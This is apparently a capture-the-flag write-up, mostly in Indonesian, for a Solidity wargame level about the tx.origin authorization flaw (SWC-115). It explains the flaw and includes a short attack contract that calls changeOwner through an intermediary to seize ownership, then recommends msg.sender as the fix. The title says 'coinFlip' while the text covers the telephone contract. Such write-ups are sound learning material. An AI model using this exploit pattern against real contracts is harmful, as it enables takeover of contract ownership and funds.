## coinFlip — Level 3

### Alur Logika Contract

dalam contract telephone ini sebenarya cukup simple jika kamu mengetahui apa itu tx.origin karena sama seperti contract" sebelum nya tugas kita adalah menjadi owner dari contract itu  dan ada cara nya yang tertulis di contract itu pada function changeOwner

### Vulnerability
Nama: swc-115
Penjelasan:tx.origin is a global variable in Solidity which returns the address of the account that sent the transaction. Using the variable for authorization could make a contract vulnerable if an authorized account calls into a malicious contract. A call could be made to the vulnerable contract that passes the authorization check since tx.origin returns the original sender of the transaction which in this case is the authorized account.


 
### Impact
penyerang dapat menjadi owner hanya dengan memanggil function changeOwner dengan contracct lain agar bisa menjadi owner

### Cara Eksploit
penyerang dapan membuat contract exploit untuk memanggil function changeOwner unruk mengubah owner menjadi penyerang karena bukan dia pemanggil langsung function 
cara nya dengan membuat contrtact yang menargetkan contrct telephone dan memanggil function changeOwner

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack { ITelephone public targetContract; 
constructor(address _telephone) {
   targetContract = ITelephone(_telephone);
}

function attack() public {
    targetContract.changeOwner(msg.sender);
}
}


### Rekomendasi Fix
tx.origin tidak boleh digunakan untuk otorisasi. Use msg.sender sebaliknya.